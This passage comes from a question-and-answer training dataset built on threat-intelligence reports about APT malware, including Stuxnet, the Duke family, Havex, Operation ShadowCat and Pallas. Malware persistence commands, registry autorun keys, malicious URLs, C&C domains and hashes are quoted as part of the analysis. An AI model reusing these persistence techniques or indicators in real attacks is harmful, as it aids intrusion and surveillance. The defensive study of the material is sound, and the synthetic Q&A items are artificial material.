bytes at at time with the key 0xCAFEBABE, and decrypts the decoy by XOR'ing four bytes at a time using the key 0xBAADF00D. Here is a visual representation of the delimiters and embedded files:\nAfter decrypting the payload, it saves the file to the following location:\n%APPDATA%\\Microsoft\\Office\\OutL12.pip\nThe shellcode then creates the following registry key to automatically run the payload each time the system starts:\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run : Microsoft\nThe shellcode saves the following command to this autorun key, which will execute the OutL12.pip payload, specifically calling its 'WinCred' exported function:\nrundll32.exe\n\"%APPDATA\\Roaming\\Microsoft\\Office\\OutL12.pip\",WinCred\nThe shellcode will then overwrite the original delivery document with the decrypted decoy contents and open the new document.\nQ: How did the Werow macro used in the Microsoft Word documents achieve persistence on the infected systems?",
    "output": "The Werow macro used in the Microsoft Word documents achieved persistence by creating specific paths and registry keys. It built path strings for '%APPDATA%\\d.doc' and '%APPDATA%\\Microsoft\\Office\\WinCred.acl', where 'd.doc' stored a copy of the Word document and 'WinCred.acl' contained the dropped payload, typically a DLL. The macro then used rudimentary obfuscation to hide and re-assemble strings for the registry key 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinCred' and the command 'rundll32 %APPDATA%\\Microsof\\Office\\WinCred.acl ,WinCred'. These steps ensured that the malware would run every time the system started.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nThe People's Republic of China (PRC) may be a global power economically but its military lacks force projection beyond the Asia Pacific region. Its traditional military hardware is one to three generations behind the US and Russia. In light of these deficiencies it is probable that cyber warfare will provide China with an asymmetric advantage to deter aggression from stronger military powers as they catch up in traditional military capabilities. Cyber warfare would also allow China to leapfrog by means of technology transfer and exploiting adversary weaknesses. This investigation will address three primary questions: What is China's current military capability? How would cyber warfare allow China to seriously advance its strategic abilities? And what is the evidence that China is headed in a cyber warfare direction?\n\nAnswer this question based on the above context: How does the concept of cyber warfare provide an asymmetric advantage for China, given its current military capabilities and economic status? Explain the strategic benefits and potential outcomes of this approach.",
    "output": "China, while being a global economic power, has military capabilities that are one to three generations behind those of the US and Russia, particularly in terms of force projection beyond the Asia Pacific region. Cyber warfare offers China an asymmetric advantage by allowing it to deter aggression from militarily stronger powers. This is achieved through two primary means: firstly, by leveraging technology transfer to rapidly advance its military capabilities, and secondly, by exploiting the weaknesses of its adversaries. By focusing on cyber warfare, China can effectively 'leapfrog' traditional military development stages, enhancing its strategic abilities significantly. This approach not only compensates for its current military deficiencies but also positions China to gain a competitive edge in future conflicts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nA security researcher first detected and reported a  in 2023. Based on these similarities, we suspect that the malicious LNK file is distributed to users via spam email. The attack starts with a deceptive shortcut (.LNK) file that deceives users into opening it. Once executed, the .LNK file runs a PowerShell command that drops a malicious .NET loader file and a decoy Word document on the victim's machine. The PowerShell script then invokes methods in the .NET file, which are designed to fetch a steganographic PNG image from a remote server.\nThis image contains a Gzip-compressed payload. The methods also decompress the payload and inject it into the PowerShell.exe process. These actions are executed entirely in memory to avoid detection by security products.\nCyble Research & Intelligence Labs has dubbed this attack \"Operation ShadowCat\" due to its stealthy characteristics, including the use of a C&C server at \"use1.netcatgroup.site\" and the custom \"NetCat\" subprotocol employed for WebSocket communication.\nThe final payload is a RAT written in the Go programming language. This RAT provides extensive control over the infected system, enabling file and directory manipulation, command execution, and interactive communication with a Command & Control server.\nUpon successful infection, this RAT can enable ransomware activities, stage environments for payload deployment, gather detailed system information, perform network scanning, and upload sensitive data from the victim's machine. It also uses tools for Active Directory mapping and credential extraction, facilitating advanced lateral movement and attack strategies. The figure below shows an overview of the infection.\n\nBased on the above text, answer a question. How does Operation ShadowCat leverage steganography and in-memory execution to evade detection, and what are the key components involved in this process?",
    "output": "Operation ShadowCat employs several sophisticated techniques to evade detection. The attack begins with a deceptive shortcut (.LNK) file that, when executed, runs a PowerShell command. This command drops a malicious .NET loader file and a decoy Word document onto the victim's machine. The PowerShell script then invokes methods within the .NET file to retrieve a steganographic PNG image from a remote server. This image contains a Gzip-compressed payload, which is subsequently decompressed and injected into the PowerShell.exe process. By executing these actions entirely in memory, the attack avoids detection by traditional security products. The key components involved in this process include the initial .LNK file, the PowerShell script, the .NET loader file, the steganographic PNG image, and the final payload, which is a Remote Access Trojan (RAT) written in the Go programming language.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "www.nahoonservices.com/wp-content/plugins/rss-poster/negc.html \u2192\nee6409deb87cabb1d573b9e1367bd0df, negc.html, Exploit.JS.CVE-2013-1347.a ec7ce1f3eac658ebd31d26d8d719b14903502cdea4938e6935a74d9355fe5282\n2e27a5d1a4f4cf5729d23303a56daa70, negc.html, Exploit.JS.CVE-2013-1347.b\n03637d861d1b58863a212d4993fe4d2f, tmpprovider0.dll, Trojan-Dropper.Win32.Daws.bqsi cb58396d40e69d5c831f46aed93231ed0b7d41fee95f8da7c594c9dbd06ee111\nThe exploit itself is finicky. It is another rip of the corresponding metasploit code, with minor modifications. See \"Obvious Metasploit Rips\" below. The shellcode delivered with the exploit is nothing out of the ordinary, using expected thread environment variables to identify module locations in the memory...\nThe shellcode gets more interesting due to the manner in which the download url string was built.\nThe encoding algo was a simple additive 0x1010101 against every four bytes of the reversed string \"kenzhebek.com/tiki/files/templates/listpages/hoem.php\", which was downloaded as a Havex backdoor. The decoder looks like this...\nCVE-2012-1889 - Internet Explorer components exploit\nroxsuite.com/includes/phpmailer/irl.html \u2192\n8b15ef4815c771a94b4adcaee8c67100\n718c6211cb78e5fea0e02be4960c23f6c1cdb1eedeb7a711b595b422c84076a3\nroxsuite.com/includes/phpmailer/page.jpg \u2192\nc:\\DOCUME~1\\p\\LOCALS~1\\Temp\\sysplug.exe\n11c3bb242264fe5146854ca27ebd50b0, sysplug.exe, Worm.Win32.WBNA.pdj Signed with Intel Certificate, Root CA Intel (likely spoofed)\n\u2192 %temp%\\crtscp.exe\n59f7a5d39c47bd62fedf24f5f2ea6e01, crtscp.exe, Worm.Win32.WBNA.pdj\n24c9d984bdaf2152bde121393efbaa894d3a361090f6b97623a90567c27ee2ca\n\u2192 %temp%\\spoolsv.dll\n5441c2cfbdf1feafc3dafd69c34f5833, spoolsv.dll, Trojan.Win32.Agent.icrq\n103ee051b40466a13f03021903ea49194c1d1e31064173e21798502bcf7e276a\nIdentifying the clsid used in this script is a giveaway on the targeted MS XML Core Services software:\nOf course, most of this code appears to be ripped from the corresponding metasploit exploit code. Interestingly, the metasploit code was derived from 0day Itw at the time in June 2013. But the\nattackers didn't use it until after the vulnerability was patched. The Yeti attackers simply did not need a 0-day arsenal.\nThe attackers must have known or expected that they were targeting Internet Explorer 7 on the victims' systems. The later, updated versions of the corresponding metasploit code maintain ROP to evade problems with attacking IE 8+ ASLR/DEP protections, but the Yeti code does not. This absence is somewhat odd, because KSN events indicate the code was active in August 2013, and the metasploit dev added ROP to their code in June 2013.\nThe shellcode delivered from this exploit also includes an unusual url and filename string build routine:\nThe decoded strings here:\n\nIn the context of the Crouching Yeti APT group, how did the attackers encode the URL string for the Havex backdoor, and what implications does this have for cybersecurity professionals?",
    "output": "A: The attackers encoded the URL string 'kenzhebek.com/tiki/files/templates/listpages/hoem.php' using a simple additive 0x1010101 against every four bytes of the reversed string. This encoding method was used to obfuscate the URL, making it less detectable by standard security measures. For cybersecurity professionals, this highlights the importance of understanding various encoding techniques and implementing detection mechanisms that can identify and decode such obfuscated strings. It also underscores the need for continuous monitoring and analysis of network traffic to detect unusual patterns that may indicate malicious activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: PinchDuke\nThe PinchDuke campaign, which operated from November 2008 until summer 2010, is believed to be the first campaign of the Duke malware family. PinchDuke targeted political organizations in Georgia, Turkey, Uganda, and the United States. The PinchDuke campaigns began 11 days after President Obama's April 5, 2008 speech concerning the deployment of missile defenses in Poland. In 2009 the campaign targeted the Ministry of Defense in Georgia, the ministries of foreign affairs in Turkey and Uganda, a United States foreign policy think tank, organizations associated with NATO exercises in Europe, and the Georgian Information Centre on NATO.  In 2010, the group also targeted Kazakhstan, Kyrgyzstan, Azerbaijan, and Uzbekistan. The political nature of the targets suggests that the campaigns may have been state sponsored. The selection of targets closely mirrors those of the later APT 28/ Sofacy campaigns, which is widely believed a Russian state sponsored threat actor.\nLike the rest of the Duke family of malware, the threat actor is attributed to Russia because error messages in the malware are written in Russian. Though many regions in Eastern Europe use Russian as their primary language, time stamps in the code suggest that the malware was developed in the same time zone as Moscow. The PinchDuke Trojan samples contain a text string that may serve as a campaign identifier to help the attackers differentiate between associated Duke malware campaigns that were run in parallel using similar exploitation kits.\nThe malware was delivered via phishing emails containing spoofed news articles from the BBC website or articles concerning NATO. The malware consists of multiple loaders and an information stealer trojan. The trojan is based around the source code of the information stealing malware, LdPinch, which has been available on underground forums since the early 2000s. PinchDuke's information stealer targets system configuration files, user credentials, and user files that were created within a predefined timeframe or whose file extension corresponds to a predefined list. PinchDuke communicated with its C&C servers through HTTP(s).  In early 2010, PinchDuke campaigns decreased as other Duke campaigns began. Afterwards, PinchDuke or its components were absorbed into other campaigns. Notably, its loaders were later associated with CosmicDuke and occasionally the newer malware would install PinchDuke in its entirety on a victim system as a redundancy infection.\nMedium Headline: GeminiDuke\nGeminiDuke was developed and deployed around the same time as PinchDuke and CosmicDuke. Unlike its sister campaigns, the January 2009 \u2013 December 2012 GeminiDuke campaign focused on collecting system configuration information from infected hosts. Samples of the GeminiDuke malware were compiled in UTC+3 and UTC+4 (depending upon the season), which corresponds to Moscow Standard Time during Daylight Savings Time.\nLike PinchDuke and CosmicDuke, GeminiDuke was designed around a core information stealer component. The malware consisted of a loader, an information stealer, and numerous persistence components. The information stealer used a mutex based around a timestamp to ensure that only one instance of the malware was running at a time. The information stealer enumerates: local user accounts, network settings, internet proxy settings, installed drivers, running processes, values of environment variables, programs that run at startup, programs previously executed by the users, programs installed in the Programs Files folder, the files and folders in the users' home folder, the files and folders in the users' My Documents folder, and recently accessed files, folders, and programs.  The malware employs multiple persistence\ncomponents similar to those included in CosmicDuke. MiniDuke's backdoor component resembles the source code behind one of GeminiDuke's persistence modules.\nMedium Headline: CosmicDuke/ Tinybaron/ BotgenStudios/ NemesisGemina\nCosmicDuke is believed to have been developed and deployed by the same team as PinchDuke. CosmicDuke was compiled on January 16, 2010 and was still active as of June 2015. CosmicDuke superseded the PinchDuke campaign and its toolkit surpasses the functionality of the PinchDuke exploit kit. Unlike PinchDuke, CosmicDuke appears to be entirely custom written to the adversary's specifications. The techniques that CosmicDuke uses to extract user credentials and detect analysis tools may be based on PinchDuke. At a high-level, CosmicDuke's persistence techniques resemble those of GeminiDuke. Despite the similarities to the other Duke malware, CosmicDuke does not share any code with its sibling campaigns. CosmicDuke was most famously deployed against individuals believed to be trafficking illicit substances in Russia. It is possible that Russia's law enforcement agencies used the malware as spyware in their war against drugs.\nCosmicDuke deploys from a series of loaders and the malware is built around an information stealer that is augmented by persistence components and a privilege escalation tool. Early variants of the privilege escalation module attempted to exploit CVE-2010-0232 or CVE-2010-4398. The malware authors likely chose which persistence and escalation tools to include in each variant of the malware in order to exploit known vulnerabilities in the target environment. For instance, in 2014, after the exposure of MiniDuke, Kaspersky noted the appearance of a CosmicDuke variant that featured a backdoor and the ability to start via Windows Task Scheduler.\nThe information stealer contains components to log keystrokes, capture screenshots, copy the contents of the clipboard, copy cached user credentials from web browsers and chat clients, export cryptographic certificates and private keys, and exfiltrate user files whose file extension corresponded to a predefined list. Additionally, CosmicDuke occasionally infected hosts with PinchDuke, GeminiDuke, or MiniDuke; though, CosmicDuke code never interoperated with the redundant malware code. After execution, the two malware ran concurrently and independent of one another. Typically, the malware even utilized different C&C infrastructure. F-Secure postulates that CosmicDuke may have deployed the other malware to allow the adversary to field test CosmicDuke while relying on the redundant malware to capture mission critical data should CosmicDuke not function correctly on the infected machine. CosmicDuke can exfiltrate the stolen data to hardcoded C&C servers via HTTP(s), FTP, or WebDav.\nMedium Headline: MiniDuke\nMiniDuke is a highly customizable malware platform that was uncovered by Kaspersky Lab in February 2013. The malware may have been developed as early as 2010. According to Eugene Kaspersky, MiniDuke is unique in that it resembles more complex old school malware; in fact, many of its components are written in Assembly, a complex low-level programming language. This could indicate that the Russian authors behind MiniDuke have significant experience in the field.\nThe initial MiniDuke campaign compromised government institutions in Ukraine, Belgium, Portugal, Romania, the Czech Republic, and Ireland. Additionally, a research institute, two think tanks, and a healthcare provider were compromised in the United States, as well as a research foundation in Hungary. Victims were targeted with spear phishing emails containing malicious PDF files. If opened, the malicious attachments exploited a zero-day vulnerability and dropped a small downloader (20kb) onto the victim system.\nThe malware drops in 3 stages that are designed to evade sandbox, virtual, and analysis environments. Checks are processed at each stage before the malware decrypted more of itself. The downloader appears to be unique to the victim system and contains a customized backdoor. The downloader determines the system fingerprint and it later uses the information to encrypt its communication with the C&C server. If the target system meets pre-defined requirements and if the malware successfully installs, then the malware will access Twitter as a background process and search for specific tweets from pre-made accounts. Similar C&C infrastructure via Twitter can be found in variants of OnionDuke, CozyDuke, and HammerDuke. The tweets, authored by the malware operators, contain tags that correspond to the encrypted URLs where the backdoors are stored. The URLs lead to the C&C servers that contain commands and backdoors as .GIF files. In the event that Twitter is inaccessible, then the malware will run Google search in the background to find the encrypted strings that lead to the next C&C server.\n\nWhat were the unique features and deployment strategies of the CosmicDuke malware, and how did it relate to other Duke family malware?",
    "output": "CosmicDuke, active from January 2010 to at least June 2015, was entirely custom-written and surpassed the functionality of PinchDuke. It deployed via a series of loaders and included an information stealer augmented by persistence components and a privilege escalation tool. It logged keystrokes, captured screenshots, copied clipboard contents, and exfiltrated user files. CosmicDuke occasionally infected hosts with PinchDuke, GeminiDuke, or MiniDuke as redundancy, but these malware ran independently. CosmicDuke could exfiltrate data via HTTP(s), FTP, or WebDav to hardcoded C&C servers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summary\nSecureWorks\u00ae Counter Threat Unit\u2122 (CTU) researchers track the activities of Threat Group-4127(TG-4127), which targets governments, military, and international non-governmental organizations (NGOs). Components of TG-4127 operations have been reported under the names APT28, Sofacy, Sednit, and Pawn Storm. CTU\u2122 researchers assess with (<https://www.secureworks.com/research/threat-group-4127-targets-hillary-clinton-presidential-campaign#appendix>)moderate confidence that the group is operating from the Russian Federation and is gathering intelligence on behalf of the Russian government.\nBetween October 2015 and May 2016, CTU researchers analyzed 8,909 (<https://bitly.com/>)Bitly links that targeted 3,907 individual Gmail accounts and corporate and organizational email accounts that use Gmail as a service. In March 2016, CTU researchers identified a spearphishing campaign using Bitly accounts to shorten malicious URLs. The targets were similar to a 2015 TG-4127 campaign \u2014 individuals in Russia and the former Soviet states, current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, and authors and journalists \u2014 but also included email accounts linked to the November 2016 United States presidential election. Specific targets include staff working for or associated with Hillary Clinton's presidential campaign and the Democratic National Committee (DNC), including individuals managing Clinton's communications, travel, campaign finances, and advising her on policy.\n\nBased on the above text, answer a question. Why did SecureWorks Counter Threat Unit (CTU) researchers assess with moderate confidence that Threat Group-4127 (TG-4127) is operating from the Russian Federation and gathering intelligence on behalf of the Russian government? How does this assessment help cybersecurity experts in dealing with similar attacks?",
    "output": "SecureWorks CTU researchers assessed with moderate confidence that Threat Group-4127 (TG-4127) is operating from the Russian Federation and gathering intelligence on behalf of the Russian government based on the group's targeting patterns and operational components. These components have been reported under various names such as APT28, Sofacy, Sednit, and Pawn Storm. The assessment helps cybersecurity experts by providing insights into the geopolitical motivations behind the attacks, allowing them to anticipate potential targets and tailor their defensive strategies accordingly. Understanding the adversary's objectives and methods enables better threat modeling and more effective implementation of security measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: 4.2.1.1 Encrypted data\nThis driver is designated to inject code into the address space of the processes in the system. It is registered in OS as a boot start service. Thus it is loaded as early as possible in the OS boot process. Some of its data are encrypted with a custom encryption algorithm. If we decrypt them, we get the following string constants with the following meanings:\nTable 4.2.1 \u2013 Decrypted String Constants Found in the Driver\nTo be able to inject code it registers a special routine that is called each time a module is loaded in address space of a process by calling API function PsSetLoadImageNotifyRoutine.\nVery Small Headline: 4.2.1.2 Configuration data\nThe driver holds configuration data that specify in which processes the code is to be injected. The data are stored in driver's registry key with the value name presented in Table 4.2.1. The data can also be stored in a file on disk: if the driver failed for some reason to read the configuration data from registry, it reads it from the file, if any exists. Here is configuration data found on an infected machine:\nAs we can see from the figure, these data specify what modules should be injected by the driver into the address spaces of certain processes. For instance, here we see that in processes in which executables\nhave the names services.exe, S7tgtopx.exe and CCProjectMgr.exe, the driver injects a module stored in a file with the name \\SystemRoot\\inf\\oem7A.PNF. The configuration data also specify the name or ordinal number of the export of the injected module to be called. For instance in this case, when oem7A.PNF will be loaded into the address spaces of the CCProjectMgr.exe or S7togtopx.exe, the exported function number 2 should be called. In the case of services.exe the exported function with the ordinal 1 should be called. If a process is debugged the driver doesn't perform an injection, and it determines whether the process is debugged by reading BeingDebugged field of the PEB structure related to the process.\nVery Small Headline: 4.2.1.3 Injector\nHere we briefly describe the injector. It is not only capable of injecting modules into the address space of a process but is also able to stealthily call an exported function from the already injected modules. The injection of a module is performed in three stages:\n1. Allocating memory in the address space of the target process and copying module and supplemental code into the newly allocated buffer;\n2. Initializing supplemental data and code with import from kernel32.dll library, and overwriting the first bytes of the entry point of the process image;\n3. Mapping the module to inject into the address space of the process, initializing import address table, fixing relocations, calling its entry point and restoring the original bytes of the image entry point.\nVery Small Headline: Stage 1\nWhen the process image is loaded into the address space of the process, the notification routine is called and the driver determines whether the process is debugged. If it isn't, it looks in its configuration data to get the name of the module to inject. Once it obtains the name of the module it allocates two buffers in the process, one for the module and another for supplemental code. Then it sets memory\nprotection of the entry point region to PAGE_EXECUTE_WRITECOPY, a value which makes it writable. In the following figure we can see a layout of the modules in the user-mode address space of the process:\nVery Small Headline: Stage 2\nAt the second stage, when the driver receives notification that kernel32.dll has been mapped into the address space of the process, it initializes import of the supplemental code from the loaded library and overwrites the first seven bytes of the entry point of the process image with the following commands:\nAPIs exported by kernel32.dll and used by supplemental code are: VirtualAlloc, VirtualFree, GetProcAddress, GetModuleHandle, LoadLibraryA, LoadLibraryW, lstrcmp, lstrcmpi, GetVersionEx, DeviceIoControl. The layout of the modules at this stage is presented on the following figure:\nVery Small Headline: DeviceIoControl\nThe driver creates a device object with the name specified in Table 4.2.1 and registers handlers for the following requests:\nIRP_MJ_CREATE;\nIRP_MJ_CLOSE;\nIRP_MJ_DEVICE_CONTROL.\nThe first two handlers do nothing but successfully complete IRP packet, while the third handler is used to dispatch control requests from an application. When the created device object receives an IRP_MJ_DEVICE_CONTROL request with IOCTL equal to 0x223800 it changes memory protection of the region specified in the request parameters:\nstruct IOCTL_PARAMS\n{\n};\nWhen supplemental code changes memory protection of the entry point it initializes this structure and passes it as a parameter to DeviceIoControl API.\nSmall Headline: 4.2.2 MRXNET.sys\nThe purpose of this driver is to hide files that are used to propagate the malware through USB drives. It acts as a file system driver filter. In the very beginning of its initialization it registers the FileSystemRegistrationChange routine enables it to attach to file systems available in the system, but it is interested only in ntfs, fat and cdfs file systems. When a new file system is mounted the driver receives a notification, creates a device object and attaches it to the top of the device stack. From then on the driver is able to monitor all the requests that are addressed to the file system. It waits for an IRP_MJ_MOUNT_VOLUME request to arrive and attaches itself to the mounted volume to intercept requests related to operations with files and directories. It creates DeviceObjects and attaches it to those device objects created by and corresponding to the specified file system drivers. The driver hooks IRP_MJ_DIRECTORY_CONTROL requests addressed to the file systems it is attached to, enabling it to filter results from querying information about files and subdirectories. This request is used to get information related to the directory, and in particular what files are located in the directory.\nIt hides the same files as ~WTR4141.tmp does:\nfiles with \".LNK\" extension with a file length of 1471 (0x104b) bytes;\nfiles with \".TMP\" extension where the name consists of 12 characters (including extension) in the following format: \"~WTRabcd.TMP\", where a,b,c,d are digits from 0 to 9 which sum modulo 10 equals 0 (\"~WTR4411.TMP\" for example).\nOn receiving an IRP_MJ_DIRECTORY_CONTROL request it sets an IO completion routine that filters results of the request. Depending on the control operation that is requested, the driver goes through the corresponding structure and deletes all entries matching the search criteria.\nMedium Headline: 4.3 Stuxnet Bot Configuration Data\nStuxnet stores its encrypted configuration data (1860 bytes) in %WINDIR%\\inf\\mdmcpq3.pnf. A decryption algorithm is presented in Appendix A. These data contain information about:\nURLs of C&C servers (see figure below);\nActivation time \u2013 the time and date after which the worm is active;\nDeactivation time \u2013 the time after which the worm becomes inactive and deletes itself;\nVersion of the malware;\nThe minimum quantity of files that the removable drive should contain to drop malicious .LNK files successfully;\nOther information about its propagation and functioning.\n\nBased on the above text, answer a question. How does the Stuxnet driver ensure that it can inject code into the address space of processes even if it fails to read configuration data from the registry?",
    "output": "The Stuxnet driver holds configuration data specifying which processes the code should be injected into. This data is primarily stored in the driver's registry key. However, if the driver fails to read the configuration data from the registry, it attempts to read it from a file on disk. This redundancy ensures that the driver can still function correctly even if the registry access fails.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary targets of 'The Mask' APT campaign, and how does the complexity of its toolset contribute to its effectiveness?",
    "output": "The primary targets of 'The Mask' APT campaign include government institutions, diplomatic entities, energy and oil companies, private companies, research institutions, private equity firms, and activists. The campaign's effectiveness is enhanced by the complexity of its toolset, which includes sophisticated malware, rootkits, bootkits, and versions for various operating systems (Windows, Mac OS X, Linux, and possibly Android and iOS). This multi-platform capability and advanced malware make 'The Mask' one of the most sophisticated threats, potentially indicating a nation-state sponsored campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Mantra Tech Ventures and INNEFU\nMantra Tech Ventures is the registration service for several of the malicious domains that have been in use. The service first came to our attention because it was used for registering the Command & Control domains cobrapub.com, mymyntra.net, and n00b4u.com. In addition, Mantra Tech Ventures owns abhedya.net, which seems to be a name server service for domains registered by them. Abhedya has been used by several sites in the attack infrastructure like currentnewsstore.com, crvhostia.net, webmicrosoftupdate.net and fuzzyfile.net.\nabedhya.net is currently a privacy protected domain, but it used to be registered by one Arun Bansal, CEO and founder of Mantra Ventures and the \"Ethical Hacking Institute\" hackingtruths.org.\nDomain Name: ABHEDYA.NET\nRegistrant:\nHackingTruths Arun Bansal\n(arun@hackingtruths.org)\n*** ********* ***** *******\n******\nDelhi,110085\nIN\nThe domain appinonline.com is also hosted on the cloud service mantragrid.com, a Mantra Ventures company.\nThere is another interesting detail: We found a connection log on one of the open drop folders earlier mentioned. This log folder was named \"test\" and data in it was uploaded from an IP belonging to the French provider OVH. The log contained data from a lab test PC whose registered owner was \"innefu\".\nThere is indeed an Indian information security consulting group named Innefu. The domain innefu.com was registered by the same Arun Bansal. Innefu also hires \"ethical hackers\":\nIt is possible that Mantra Tech Ventures hosted the malicious sites by coincidence, and it is possible that INNEFU (if indeed the mentioned log came from them) just happened to run the malware in an automatic test system like many other security vendors do as part of their malware analysis research.\nBig Headline: Conclusion\nWhen researching the attack against Telenor we were able to uncover that actors apparently operating from India have been conducting attacks against business, government and political organizations around the world for over three years.\nThere are also indicators of involvement by private sector companies or persons connected to these, though these data are circumstantial and may be attempts to implicate said companies.\nWe have no visibility into whether the attacks were done on behalf of others, and if so who commissioned them or whether all attacks were commissioned by one entity or by several.\nThe methods used were primarily based on different social engineering tactics rather than exploits, but history has shown that social engineering based attacks can be very successful, confirmed once again by looking at the data we have been able to uncover.\nOrganizations today need to realize that it's not a matter of whether they will be compromised but a question of when and have a plan in place for how to deal with those compromises.\nBig Headline: Bibliography\n1. Scumware.org. Scumware search. scumware.org. [Online] http://www.scumware.org/report/173.236.24.254.\n2. MacKenzie, Stuart. [Online] http://www.thetimes.co.uk/tto/multimedia/archive/00372/DOC100113100120132_372895a.pdf.\n3. Wikipedia. CME Group. Wikipedia. [Online] http://en.wikipedia.org/wiki/CME_Group.\n4. WIPO. WIPO Arbitration and Mediation Center. WIPO. [Online] http://www.oapi.wipo.net/amc/en/domains/search/text.jsp?case=D2012-1666.\n5. Domaintools. Domaintools History. Domaintools. [Online] http://www.domaintools.com/research/whoishistory/?page=details&domain=hackerscouncil.com&date=2011-04-03.\n6. ThreatExpert Analysis. ThreatExpert. [Online] http://www.threatexpert.com/report.aspx?md5=4a44b6b6463fa1a8e0515669b10bd338.\n7. Scumware.org. Scumware search. Scumware.org. [Online] http://www.scumware.org/report/bluecreams.com.\n8. Viruswatch. Virus-sites with status changes. Clean-MX.com. [Online] http://lists.cleanmx.com/pipermail/viruswatch/20110317/023586.html.\nPassive DNS data provided by ISC Security (https://security.isc.org/)\nBig Headline: Appendixes (available in a separate document)\nA. Samples extracted from Telenor intrusion\nB. Some related cases based on behaviour and malware similarity parameters.\nC. Malware string indicators\nD. Project and debug paths extracted from executables\nE. Domain names connected to case\nF. IP addresses connected to case\nG. Sample MD5's\nNorman Shark is a global leader and pioneer in proactive security software solutions and forensics malware tools. Norman Shark offers enterprise customers a portfolio of solutions for analyzing and building defensible networks against advanced targeted attacks. Formerly part of Norman AS, a Norway-based IT security company established in 1984, Norman Shark became an independent company in January 2013, to allow the company to focus on developing solutions for  Threat Discovery, security analytics and ICS protection to address the growing needs of the enterprise market.\n\nWhat role did the domain abhedya.net play in the attack infrastructure, and who was initially associated with its registration?",
    "output": "The domain abhedya.net played a crucial role as a name server service for several domains used in the attack infrastructure. Initially, it was registered by Arun Bansal, the CEO and founder of Mantra Ventures and the 'Ethical Hacking Institute' hackingtruths.org. Although it is now privacy protected, its past association with Arun Bansal indicates a potential link between Mantra Ventures and the attack infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: APT Group Targets Indian Defense Officials Through Enhanced TTPs\nDuring our routine threat hunting exercise, Cyble Research Labs came across a malware sample (<https://twitter.com/s1ckb017/status/1435888576710029315>)posted on Twitter by a researcher who believes that the malware belongs to Transparent Tribe, an Advanced Persistent Threat (APT) Group. Given the nature of the victim and the way they are targeted, we can draw some similarities to the Side Copy APT group.\nBoth APT groups are known to have mainly targeted India's Defense and Government sectors in the past. Additionally, both groups have used various other RAT and malware to launch campaigns via multiple modes such as phishing, delivering payload via mail, etc. The malware posted by the researcher on Twitter has used a technique to hide the actual malware in the .vhdx file to avoid any antivirus detection. As per (<https://en.wikipedia.org/wiki/VHD_%28file_format%29>)Wikipedia, .vhdx is the successor of VHD (Virtual Hard Disk).\nThe figure below shows the high-level execution flow of the malware. Upon execution, the malware checks for the current time zone. If it is able to verify that the victim system's time zone is in IST, it connects to the attacker's URL for downloading the second stager. Once downloaded, it executes the second stager payload and deletes itself.\nThe second stager payload checks that only one instance of the malware is running, and then it connects with the attacker's Command and Control (C&C) server to start receiving the commands from Threat Actor (TA).\n\nQuestion: How does the Transparent Tribe APT group utilize the .vhdx file format to evade antivirus detection, and what is the significance of this technique in the context of their targeting strategy?\n\nAnswer:",
    "output": "The Transparent Tribe APT group utilizes the .vhdx file format to hide the actual malware, thereby avoiding antivirus detection. The .vhdx format is the successor of VHD (Virtual Hard Disk), which is typically used for virtual machine storage. By embedding the malware within a .vhdx file, the group can exploit the fact that many antivirus solutions do not scan these types of files as thoroughly as they do traditional executable formats. This technique allows the malware to remain undetected during initial infection stages. The significance of this approach lies in its ability to bypass common security measures, enabling the APT group to successfully target high-value entities such as India's Defense and Government sectors. This method showcases the group's advanced tactics, techniques, and procedures (TTPs) aimed at evading detection and ensuring the successful delivery of their malicious payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Pallas \u2014 Dark Caracal's Custom Android Samples\nUsing our global sensor network, Lookout researchers identified 11 unique Android surveillanceware apps tied to the Operation Manul campaign10. The trojanized apps still retain the legitimate functionality of the apps they spoof and behave as intended.  The apps are found predominantly in trojanized versions of well-known secure messaging apps including:\n\u2022 Signal (org.thoughtcrime.securesms)\n\u2022 Threema (ch.threema.app)\n\u2022 Primo (com.primo.mobile.android.app)\n\u2022 WhatsApp (com.gbwhatsapp)\n\u2022 Plus Messenger (org.telegram.plus)\nWe also identified Pallas in trojanized versions of two apps aimed at users seeking to protect themselves and their data online:\n\u2022 Psiphon VPN (com.psiphon3)\n\u2022 Orbot: TOR Proxy (org.torproject.android)\n10 (<http://www.cmcm.com/blog/en/security/2017-08-16/1101.html>)http://www.cmcm.com/blog/en/security/2017-08-16/1101.html\nFinally, with help from Google's Android Security team, we discovered Pallas lurking in several apps purporting to be Adobe Flash Player and Google Play Push for Android:\n\u2022 Flash Player (com.flashplayer.player)\n\u2022 Google Play Push (com.flashplayer.player)\nNeither the desktop nor the mobile malware tooling use zero day vulnerabilities. Pallas samples primarily rely on the permissions granted at installation in order to access sensitive user data. However, there is functionality that allows an attacker to instruct an infected device to download and install additional applications or updates. Theoretically this means it's possible for the operators behind Pallas to push specific exploit modules to compromised devices in order to gain complete access.\nWe found no attacker infrastructure containing rooting packages. This highlights that, in many cases, advanced exploitation capabilities like those shown by surveillance tools such as Pegasus for iOS and Chrysaor for Android (that targeted both 11 (<https://blog.lookout.com/trident-pegasus>) devices), are not essential, but helpful when targeting certain platforms.\n11(<https://blog.lookout.com/pegasus-android>) https://blog.lookout.com/pegasus-android\n12 (<https://blog.lookout.com/trident-pegasus>)https://blog.lookout.com/trident-pegasus\nThe Pallas first stage is capable of performing the following surveillance functionality on a compromised device:\n\u2022 Take photos with front or back camera\n\u2022 Exfiltrate all text messages including those received in the future\n\u2022 Retrieve latitude / longitude from GPS\n\u2022 Silently activate the device microphone to capture 